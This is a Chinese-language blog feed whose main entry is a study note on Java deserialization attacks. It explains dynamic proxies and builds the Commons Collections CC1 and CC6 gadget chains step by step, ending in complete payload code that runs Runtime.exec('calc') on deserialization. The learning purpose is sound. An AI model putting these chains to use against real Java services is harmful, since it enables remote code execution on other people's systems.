<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>1Y0NG&#39;s Blog</title>
  
  <subtitle>there is no flag</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-03-23T09:43:06.130Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>1y0ng</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>java反序列化之动态代理、cc1和cc6</title>
    <link href="http://example.com/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E5%92%8Ccc1%EF%BC%88%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%EF%BC%89/"/>
    <id>http://example.com/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E5%92%8Ccc1%EF%BC%88%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%EF%BC%89/</id>
    <published>2023-03-23T04:58:14.000Z</published>
    <updated>2023-03-23T09:43:06.130Z</updated>
    
    <content type="html"><![CDATA[<h1 id="动态代理">动态代理</h1><p><code>Java动态代理</code>是一种在运行时生成代理对象的机制，它可以在运行时动态地创建一个实现特定接口的代理类，并将所有调用委托给处理器。</p><p>在Java中，动态代理由java.lang.reflect包中的<code>Proxy类</code>和I<code>nvocationHandler接口</code>提供支持。要创建动态代理，首先必须定义一个实现InvocationHandler接口的类，该接口只有一个方法invoke(Object proxy, Method method, Object[]  args)，它会在代理对象上调用任何方法时被调用。然后，使用Proxy.newProxyInstance()方法来创建代理对象，该方法需要传递一个<code>ClassLoader对象</code>、<code>一组接口</code>以及一个<code>InvocationHandler对象</code>作为参数。</p><p>当代理对象上调用方法时，代理对象将委托给InvocationHandler对象的<code>invoke()</code>方法来处理该方法的调用。在invoke()方法内部，可以根据需要执行其他逻辑，例如记录日志或者进行权限检查，然后再将请求转发给实际的目标对象。这样就可以实现动态代理的功能。</p><p>示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HelloImpl</span> <span class="keyword">implements</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义InvocationHandler实现类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Object target;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyInvocationHandler</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Before Method Invoke&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(target, args);</span><br><span class="line">        System.out.println(<span class="string">&quot;After Method Invoke&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DynamicProxyDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建目标对象</span></span><br><span class="line">        <span class="type">Hello</span> <span class="variable">hello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HelloImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建InvocationHandler实现类</span></span><br><span class="line">        <span class="type">MyInvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyInvocationHandler</span>(hello);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建动态代理对象</span></span><br><span class="line">        <span class="type">Hello</span> <span class="variable">proxy</span> <span class="operator">=</span> (Hello) Proxy.newProxyInstance(</span><br><span class="line">                hello.getClass().getClassLoader(),</span><br><span class="line">                hello.getClass().getInterfaces(),</span><br><span class="line">                handler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用动态代理对象的方法</span></span><br><span class="line">        proxy.sayHello();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Before Method Invoke</span><br><span class="line">Hello World</span><br><span class="line">After Method Invoke</span><br></pre></td></tr></table></figure><p>由于<code>不论我们调用任何动态代理对象方法都会执行invoke方法</code>，所以为我们的反序列化利用提供了便利</p><h1 id="CC1链">CC1链</h1><p>我们之前最终的利用链是</p><p>AnnotationInvocationHandler.readObject()-&gt;AbstractInputCheckedMapDecorator.MapEntry.setValue()-&gt;TransformedMap.checkSetValue()-&gt;ChainedTransformer.transform()</p><p>我们一开始在查找有谁调用了InvokerTransformer.transform()方法的时候找的是TransformedMap的checkSetValue方法，但实际上还有很多其他的调用方法，例如在<code>LazyMap</code>中的<code>get</code>方法也调用了InvokerTransformer.transform()</p><p><img src="image-20230323132610636.png" alt="image-20230323132610636"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那我们就可以针对这一条链进行尝试</p><p>调用了get的方法很多，这里我们发现在AnnotationInvocationHandler的invoke方法里也调用了get方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> method.getName();</span><br><span class="line">    Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Handle Object and Annotation methods</span></span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">        paramTypes[<span class="number">0</span>] == Object.class)</span><br><span class="line">        <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> (paramTypes.length != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(member) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;toString&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> toStringImpl();</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;hashCode&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> hashCodeImpl();</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;annotationType&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Handle annotation member accessors</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> memberValues.get(member);<span class="comment">//调用了get方法</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IncompleteAnnotationException</span>(type, member);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result <span class="keyword">instanceof</span> ExceptionProxy)</span><br><span class="line">        <span class="keyword">throw</span> ((ExceptionProxy) result).generateException();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="number">0</span>)</span><br><span class="line">        result = cloneArray(result);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就涉及到了动态加载</p><p>于是我们需要创建一个动态代理对象，代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建目标对象</span></span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建AnnotationInvocationhandler实现类</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">annotationInvocationhandler</span> <span class="operator">=</span> (InvocationHandler)constructor.newInstance(Override.class,lazymap);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建动态代理对象</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">mapproxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(</span><br><span class="line">        map.getClass().getClassLoader(),</span><br><span class="line">        map.getClass().getInterfaces(),</span><br><span class="line">        annotationInvocationhandler);</span><br></pre></td></tr></table></figure><p>创建完了以后，我们得调用动态代理对象的一个方法，在invoke中有两个if方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">    paramTypes[<span class="number">0</span>] == Object.class)<span class="comment">//判断方法名字是否为equals</span></span><br><span class="line">    <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">if</span> (paramTypes.length != <span class="number">0</span>)<span class="comment">//传参是否不为空</span></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br></pre></td></tr></table></figure><p>必须使这两个if语句为假，才会执行到get语句那里，所以选择的方法要求<code>不是equal方法，传参还需为空，同时必须在反序列化中被调用</code>，巧合的是AnnotationInvocationHandler中的readObject刚好就存在这样的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br></pre></td></tr></table></figure><p>这里就调用了<code>memberValues.entrySet()</code>，所以我们要使memberValues=mapproxy（创建的代理对象）</p><p>如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(Override.class,mapproxy);</span><br></pre></td></tr></table></figure><p>故最后的命令执行代码为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] Transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建目标对象</span></span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建AnnotationInvocationhandler实现类</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">annotationInvocationhandler</span> <span class="operator">=</span> (InvocationHandler)constructor.newInstance(Override.class,lazymap);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建动态代理对象</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">mapproxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(</span><br><span class="line">        map.getClass().getClassLoader(),</span><br><span class="line">        map.getClass().getInterfaces(),</span><br><span class="line">        annotationInvocationhandler);</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(Override.class,mapproxy);</span><br><span class="line"></span><br><span class="line">Serialize(obj);</span><br><span class="line"><span class="type">Object</span> <span class="variable">objecj</span> <span class="operator">=</span> Unserialize(<span class="string">&quot;test.ser&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="image-20230323154644608.png" alt="image-20230323154644608"></p><h1 id="cc6链">cc6链</h1><p>之前的实验一直都是在jdk为8u65的环境下进行的，这是因为Oracle在<code>jdk8u71</code>版本就修改了AnnotationInvocationHandler的readObject方法，不再直接调用memberValues，导致之前的整条链全都行不通了</p><p>所以我们要找一条所有jdk版本都可以使用的利用链</p><p>之前我们在学URLDNS的时候利用到了HashMap里的readObject方法，这个方法会最终调用key的hashcode方法，而正好有一个TiedMapEntry类中带有hashcode方法，同时这个方法又调用了自己的getValue方法，进而调用了get方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public TiedMapEntry(Map map, Object key) &#123;</span><br><span class="line">    super();</span><br><span class="line">    this.map = map;</span><br><span class="line">    this.key = key;</span><br><span class="line">&#125;</span><br><span class="line">public Object getValue() &#123;</span><br><span class="line">    return map.get(key);</span><br><span class="line">&#125;</span><br><span class="line">public int hashCode() &#123;</span><br><span class="line">    Object value = getValue();</span><br><span class="line">    return (getKey() == null ? 0 : getKey().hashCode()) ^</span><br><span class="line">           (value == null ? 0 : value.hashCode()); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>于是命令执行代码构造如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] Transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap,<span class="string">&quot;13&quot;</span>);</span><br><span class="line">HashMap&lt;Object,Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">hashMap.put(tiedMapEntry,<span class="string">&quot;123&quot;</span>);</span><br><span class="line">Test.Serialize(hashMap);</span><br></pre></td></tr></table></figure><p>但执行的时候会发现直接就调出了计算器，说明整条链还没序列化就跑完了，原理和URLDNS类似，在HashMap的put方法中，已经调用了hashcode方法，所以我们得通过反射来解决这个问题</p><p><img src="image-20230323170709111.png" alt="image-20230323170709111"></p><p>在put前，我们要让整条链先断开，put完了以后再连上</p><p>这里我们选择断开TiedMapEntry到LazyMap的这条链，将tiedMapEntry对象的实例化代码修改为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map,<span class="string">&quot;13&quot;</span>);<span class="comment">//传入map而不是lazymap</span></span><br></pre></td></tr></table></figure><p>put完了以后在通过反射修改tiedMapEntry对象的map属性值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> tiedMapEntry.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">mapfield</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">mapfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">mapfield.set(tiedMapEntry,lazymap);</span><br></pre></td></tr></table></figure><p>所以整个命令执行代码修改为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] Transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">//断开利用连</span></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map,<span class="string">&quot;13&quot;</span>);</span><br><span class="line"><span class="comment">//TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,&quot;13&quot;);</span></span><br><span class="line">HashMap&lt;Object,Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">hashMap.put(tiedMapEntry,<span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//反射恢复利用连</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> tiedMapEntry.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">mapfield</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">mapfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">mapfield.set(tiedMapEntry,lazymap);</span><br><span class="line">Test.Serialize(hashMap);</span><br></pre></td></tr></table></figure><p>反序列化命令执行成功！！！</p><p><img src="image-20230323173008338.png" alt="image-20230323173008338"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;动态代理&quot;&gt;动态代理&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;Java动态代理&lt;/code&gt;是一种在运行时生成代理对象的机制，它可以在运行时动态地创建一个实现特定接口的代理类，并将所有调用委托给处理器。&lt;/p&gt;
&lt;p&gt;在Java中，动态代理由java.lang.reflect</summary>
      
    
    
    
    <category term="学习记录" scheme="http://example.com/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>java反序列化之DNSURL和CommonsCollections（学习记录）</title>
    <link href="http://example.com/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BDNSURL%E5%92%8CCommonsCollections%EF%BC%88%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%EF%BC%89/"/>
    <id>http://example.com/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BDNSURL%E5%92%8CCommonsCollections%EF%BC%88%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%EF%BC%89/</id>
